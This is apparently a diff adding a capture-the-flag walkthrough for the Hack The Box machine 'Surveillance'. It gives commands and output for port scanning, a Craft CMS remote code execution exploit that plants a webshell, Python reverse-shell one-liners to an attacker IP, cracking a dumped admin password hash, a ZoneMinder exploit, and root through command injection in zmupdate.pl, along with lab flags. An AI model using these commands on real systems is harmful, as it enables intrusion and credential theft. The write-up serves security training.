@@ -15,25 +15,216 @@ import Browser from "@/components/Browser.astro"
 ## Enumeration
 
 ```bash
-sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.8 -oG allPorts
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.245 -oG allPorts
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
 ```
 
 ```bash
-sudo nmap -p22,80 -sCV 10.10.11.8 -oN targeted
+sudo nmap -p22,80 -sCV 10.10.11.245 -oN targeted
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
+|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://surveillance.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
 ```
 
 ```bash
-sudo echo "10.10.11.8 surveillance.htb" >> /etc/hosts
+sudo echo "10.10.11.245 surveillance.htb" >> /etc/hosts
+```
+
+<Browser
+  url="surveillance.htb"
+  src="/walkthroughs/surveillance/0.png"
+/>
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u "http://surveillance.htb/FUZZ" -mc "all" -fc 404 
+
+.htaccess               [Status: 200, Size: 304, Words: 43, Lines: 10]
+.gitkeep                [Status: 200, Size: 0, Words: 1, Lines: 1]
+admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
+css                     [Status: 301, Size: 178, Words: 6, Lines: 8]
+fonts                   [Status: 301, Size: 178, Words: 6, Lines: 8]
+images                  [Status: 301, Size: 178, Words: 6, Lines: 8]
+img                     [Status: 301, Size: 178, Words: 6, Lines: 8]
+index                   [Status: 200, Size: 1, Words: 1, Lines: 2]
+index.php               [Status: 200, Size: 16228, Words: 5713, Lines: 476]
+js                      [Status: 301, Size: 178, Words: 6, Lines: 8]
+logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
+web.config              [Status: 200, Size: 1202, Words: 385, Lines: 28]
+wp-admin                [Status: 418, Size: 21327, Words: 348, Lines: 64]
 ```
 
 ## Foothold
+
+[Craft CMS 4.4.14 - Unauthenticated Remote Code Execution ](https://www.exploit-db.com/exploits/51918)
+
+```bash
+┌─[hector@hector-laptop] - [~/Downloads]
+└─[$] python3 51918.py http://surveillance.htb/                                                                                                                             [21:25:55]
+[+] Executing phpinfo to extract some config infos
+temporary directory: /tmp
+web server root: /var/www/html/craft/web
+[+] create shell.php in /tmp
+[+] trick imagick to move shell.php in /var/www/html/craft/web
+
+[+] Webshell is deployed: http://surveillance.htb//shell.php?cmd=whoami
+[+] Remember to delete shell.php in /var/www/html/craft/web when you re done
+
+[!] Enjoy your shell
+
+> whoami
+www-data
+```
+
+```bash
+export RHOST="10.10.14.6";export RPORT=5000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
 
 ## Post Exploitation
 
 once inside we proceed to upgrade our shell following [hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys#script) guide. 
 
-## Lateral Movement
+```bash
+$ cat /etc/passwd
+
+<...SNIP...>
+matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
+```
+
+```bash
+wget http://10.10.11.245:7000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
+unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip
+```
+
+```bash
+cat surveillance--2023-10-17-202801--v4.4.14.sql
+
+<...SNIP...>
+INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
+```
+
+```bash
+hashid -m hash.txt                                                                                                                                                    [22:04:59]
+--File 'hash.txt'--
+Analyzing '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec'
+[+] Snefru-256 
+[+] SHA-256 [Hashcat Mode: 1400]
+[+] RIPEMD-256 
+[+] Haval-256 
+[+] GOST R 34.11-94 [Hashcat Mode: 6900]
+[+] GOST CryptoPro S-Box 
+[+] SHA3-256 [Hashcat Mode: 5000]
+[+] Skein-256 
+[+] Skein-512(256)
+```
+
+```bash
+hashcat hash.txt -m 1400 /usr/share/wordlists/rockyou.txt
+39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
+```
+
+`matthew:starcraft122490`
+
+```bash
+ssh matthew@surveillance.htb
+```
+
+```bash
+matthew@surveillance:~$ cat user.txt 
+61b25f96f74b80c7960c40f5af445bdf
+```
 
 ## Privilege Escalation
 
-## Extra
+<Browser
+  url="http://localhost:2222/"
+  src="/walkthroughs/surveillance/1.png"
+/>
+
+[CVE-2023-26035](https://github.com/rvizx/CVE-2023-26035/blob/main/README.md)
+
+```bash
+python3 exploit.py -t http://127.0.0.1:2222/ -i 10.10.14.6 -p 7777
+```
+
+```bash
+nc -nlvp 7777
+```
+
+```bash
+zoneminder@surveillance:/usr/share/zoneminder/www$ whoami
+whoami
+zoneminder
+```
+
+```bash
+zoneminder@surveillance:/usr/share/zoneminder/www$ find / -type f -name "zm*" -executable -exec ls -l {} \; 2>/dev/null
+<ame "zm*" -executable -exec ls -l {} \; 2>/dev/null
+-rwxr-xr-x 1 root root 693728 Nov 23  2022 /usr/lib/zoneminder/cgi-bin/zms
+-rwxr-xr-x 1 root root 5340 Nov 23  2022 /usr/bin/zmtrack.pl
+-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl
+-rwxr-xr-x 1 root root 6043 Nov 23  2022 /usr/bin/zmcontrol.pl
+-rwxr-xr-x 1 root root 5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl
+-rwxr-xr-x 1 root root 8205 Nov 23  2022 /usr/bin/zmvideo.pl
+-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl
+-rwxr-xr-x 1 root root 788096 Nov 23  2022 /usr/bin/zm_rtsp_server
+-rwxr-xr-x 1 root root 2133 Nov 23  2022 /usr/bin/zmsystemctl.pl
+-rwxr-xr-x 1 root root 1842 Sep  5  2022 /usr/bin/zmore
+-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl
+-rwxr-xr-x 1 root root 731280 Nov 23  2022 /usr/bin/zmc
+-rwxr-xr-x 1 root root 7022 Nov 23  2022 /usr/bin/zmwatch.pl
+-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl
+-rwxr-xr-x 1 root root 4815 Nov 23  2022 /usr/bin/zmstats.pl
+-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl
+-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl
+-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl
+-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl
+-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl
+-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl
+-rwxr-xr-x 1 root root 690720 Nov 23  2022 /usr/bin/zmu
+-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl
+```
+
+```bash
+zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
+<ser='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
+
+Initiating database upgrade to version 1.36.32 from version 1
+
+WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
+Press enter to continue or ctrl-C to abort : 
+
+Do you wish to take a backup of your database prior to upgrading?
+This may result in a large file in /tmp/zm if you have a lot of events.
+Press 'y' for a backup or 'n' to continue : n
+
+Upgrading database to version 1.36.32
+Upgrading DB to 1.26.1 from 1.26.0
+bash: cannot set terminal process group (1085): Inappropriate ioctl for device
+bash: no job control in this shell
+root@surveillance:/usr/share/zoneminder/www#
+```
+
+```bash
+nc -nlvp 5000
+```
+
+```bash
+root@surveillance:/usr/share/zoneminder/www# python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+<;os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+
+```bash
+cat /root/root.txt
+42a331e03dcb97f8dcaf335eb62950e4
+```
